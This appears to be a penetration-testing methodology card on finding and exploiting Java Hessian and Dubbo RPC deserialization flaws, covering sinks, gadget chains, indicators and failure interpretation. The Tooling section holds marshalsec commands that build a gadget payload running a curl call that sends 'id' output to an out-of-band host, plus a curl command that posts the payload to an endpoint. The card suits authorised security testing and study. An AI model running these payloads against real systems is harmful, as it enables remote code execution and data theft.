# Hessian / Burlap RPC Deserialization

## Purpose

Test Java RPC endpoints using Hessian or Burlap binary serialization that pass attacker-controlled object graphs to `HessianInput` / `Hessian2Input` deserializers, enabling code execution through Java gadget chains despite the format differing from native Java serialization.

## Applicability

- Java application exposing Hessian RPC endpoints (Caucho Hessian, Spring Hessian support)
- SOA/microservice architecture with Hessian-serialized inter-service calls
- Dubbo framework (uses Hessian2 by default for Java serialization)
- Binary HTTP endpoints with `Content-Type: x-application/hessian` or `application/x-hessian`
- Endpoints returning `application/octet-stream` with RPC responses

## Preconditions

- User-controlled bytes reach `HessianInput.readObject()` or `Hessian2Input.readObject()` (directly or via service proxy)
- No class allowlist (SerializerFactory type filter) restricting deserialized types
- Java classpath contains gadget classes (same as native Java deserialization — Commons Collections, Spring, etc.)
- For Dubbo: Dubbo version < 2.7.x or misconfigured deserialization filter

## Relevant Architecture

```
HTTP POST (binary body, Content-Type: x-application/hessian)
    → HessianProxyFactory / HessianServlet
    → HessianInput.readObject() / Hessian2Input.readObject()
    → class lookup via ClassLoader
    → object graph reconstruction (constructors + setters)
    → gadget chain → exec / JNDI / file write
```

**Dubbo-specific path**
```
TCP/HTTP connection to Dubbo provider port (default 20880)
    → Dubbo protocol frame (magic: 0xdabb)
    → Hessian2 / FastJSON2 / Kryo / Java native (configurable)
    → deserialize method arguments
    → gadget chain in argument objects
```

## Technical Knowledge

**Hessian vs. native Java serialization**

| Property | Native Java | Hessian/Hessian2 |
|----------|------------|------------------|
| Magic bytes | `ac ed 00 05` | Hessian: varies by method call; Hessian2: `H \x02 \x00` prefix |
| Format | Binary opcodes | Binary with type tags |
| Gadget classes | Same classpath gadgets | Same classpath gadgets |
| Detection | `rO0` in base64 | Different binary prefix; or `x-application/hessian` Content-Type |

**Hessian2 magic prefix**
- Hessian2 call starts with `H` (`0x48`), followed by version bytes
- Response starts with `R` (`0x52`) for reply or `F` (`0x46`) for fault

**Dubbo magic bytes**
- Frame starts with `0xdabb` (2 bytes)
- Serialization type byte at offset 2 (0x08 = Hessian2, 0x06 = Fastjson, 0x03 = Java native)

**Gadget chains applicable to Hessian**
Same as native Java deserialization — classpath governs availability:
- `CommonsCollections` series
- `Spring1`/`Spring2`
- `CommonsBeanutils1`
- `ROME`
- `Resin`, `XBean`, `Groovy` (context-specific)

Note: Hessian resolves types differently than native serialization — some gadgets that require `readObject` customization may not trigger through Hessian. Test systematically.

**marshalsec (use with care)**
marshalsec provides Hessian-specific payload generation for some gadget chains. It has no stable release and bundles historical gadget dependencies — use only from a reviewed, pinned upstream commit; do not treat as a default installed tool.

```bash
# Example marshalsec usage (requires Java)
java -cp marshalsec-all.jar marshalsec.Hessian SpringPartiallyComparableAdvisorHolder "curl http://<oast>"
```

**Dubbo attack surface**
- Port 20880 (default) — unauthenticated in many deployments
- Vulnerable Dubbo versions: < 2.7.8 for CVE-2019-17564 (Hessian); < 2.7.13 for later CVEs
- Multiple serialization formats negotiable in some versions — test Java native and Hessian separately

**Alternative: Kryo**
Some RPC frameworks use Kryo instead of Hessian. Kryo does not invoke lifecycle methods by default but may still be exploitable via specific gadget patterns. Assess separately if Kryo is identified.

## Indicators

**Black-box**
- HTTP `Content-Type: x-application/hessian` or `application/x-hessian`
- Binary HTTP response starting with `R` or `F` (Hessian reply/fault framing)
- URL path patterns: `/rpc`, `/hessian`, `/service`, `*.rpc`
- Network port 20880 open (Dubbo) — confirmed via banner or service probe
- Error messages: `com.caucho.hessian.io.HessianProtocolException`, `HessianRuntimeException`

**White-box**
```java
HessianInput in = new HessianInput(inputStream);
Object obj = in.readObject();                    // sink

Hessian2Input in2 = new Hessian2Input(inputStream);
Object obj = in2.readObject();                   // sink

// Spring Hessian exporter
@Bean
public HessianServiceExporter hessianExporter() {
    HessianServiceExporter exporter = new HessianServiceExporter();
    exporter.setService(myService);
    exporter.setServiceInterface(MyService.class);
    return exporter;
}
// Service method arguments are deserialized via HessianInput
```

## Interpretation

1. **`HessianProtocolException: expected string at ...`** on malformed payload → Hessian sink confirmed; format parsing active
2. **`ClassNotFoundException: com.commons.collections.X`** → Hessian reached class resolution; gadget class not on classpath — try different chain
3. **`IllegalArgumentException`** or setter exception during property population → class instantiated; gadget misconfigured — adjust payload properties
4. **OOB DNS/HTTP callback** → gadget chain executed — RCE confirmed
5. **Dubbo 20880 responds to probe with `0xdabb` frame** → Dubbo endpoint confirmed; test serialization format

## Security-Relevant Conditions

- **Unauthenticated Dubbo port 20880**: High severity; any classpath gadget exploitable without credentials
- **Spring `HessianServiceExporter` without auth filter**: Method arguments fully deserialized before authentication
- **Custom `SerializerFactory` without allowlist**: All classpath types resolvable
- **Dubbo with multiple serialization protocols**: Each protocol is an independent attack surface — test each
- **Mixed-version microservices**: Older service may accept Hessian while newer one rejects it — test each service endpoint

## Experiment Considerations

- Start with a DNS-callback gadget (equivalent of URLDNS but for Hessian context — ROME or Spring with JNDI DNS lookup)
- Hessian gadget payload generation requires Java; prepare on a controlled host if sandbox lacks JRE
- marshalsec payload generation: use only from reviewed, pinned commit; verify output before sending
- For Dubbo: use Dubbo CVE PoC tooling matched to the specific CVE/version — generic Hessian tools may not frame correctly for Dubbo protocol
- Test service interface methods that accept complex object arguments — primitive-only arguments reduce gadget surface

## Evidence Expectations

1. Binary Hessian payload sent to identified endpoint (HTTP or TCP)
2. OOB DNS/HTTP callback received → gadget chain executed
3. Bounded exec output exfiltrated (`id`, `hostname`)
4. Document: endpoint URL / port, Content-Type, Hessian version (1 vs 2), gadget chain used, Dubbo version if applicable, classpath evidence

## Failure Interpretation

| Observation | Interpretation |
|-------------|---------------|
| `HessianProtocolException: expected H` | Payload format wrong for version (Hessian 1 vs 2 mismatch) |
| `ClassNotFoundException` | Gadget class not on classpath; try alternate chain |
| `IllegalAccessError` | Java module system restricting reflective access; try chain not relying on internal APIs |
| TCP port 20880 closed | Dubbo behind firewall; check internal network paths |
| Gadget works in test but not production | Production classpath differs from test; re-enumerate |

## False Positives

- Binary HTTP endpoint uses Hessian encoding for serialization of safe value types only; no polymorphic type resolution
- Custom `SerializerFactory` with strict allowlist of primitive and DTO types — verify allowlist is exhaustive
- Hessian used only between trusted internal services not reachable from attacker position (verify network segmentation)

## Limitations

- Some Java gadget chains require `readObject` hooks that Hessian does not invoke — test empirically, not by assumption
- Hessian payload crafting requires JRE; Linux sandbox may need marshalsec or manual binary construction
- Dubbo protocol framing is separate from Hessian; Dubbo-specific tooling needed for port 20880 attacks
- marshalsec has no stable release and its gadget chain support may be incomplete — cross-validate with alternative tools when possible

## Related Knowledge

- `java-native` — when the sink is `ObjectInputStream` rather than `HessianInput`; gadget classes overlap
- `java-polymorphic-json` — analogous type confusion via JSON rather than binary RPC
- `semantic_confusion` — pair when a proxy or gateway is expected to block RPC but path normalization bypasses it
- Dubbo CVE-2019-17564, CVE-2021-25641 — specific Hessian deserialization CVEs with known PoCs
- Caucho Hessian specification and HessianInput source for format details

## Tooling

```bash
# Probe Dubbo port for service info
nc -zv target 20880

# Hessian payload via marshalsec (from reviewed, pinned commit only)
# Clone and build marshalsec from a specific reviewed commit:
# git clone https://github.com/mbechler/marshalsec && cd marshalsec && git checkout <reviewed-hash>
# mvn clean package -DskipTests

java -cp target/marshalsec-all.jar marshalsec.Hessian \
  SpringPartiallyComparableAdvisorHolder \
  "curl http://<interactsh-host>/?q=$(id|base64 -w0)"

# Send Hessian payload via curl
curl -s -X POST \
  -H 'Content-Type: x-application/hessian' \
  --data-binary @payload.bin \
  https://target/rpc/ServiceEndpoint

# For Dubbo TCP, use purpose-built Dubbo PoC tooling matched to CVE version
```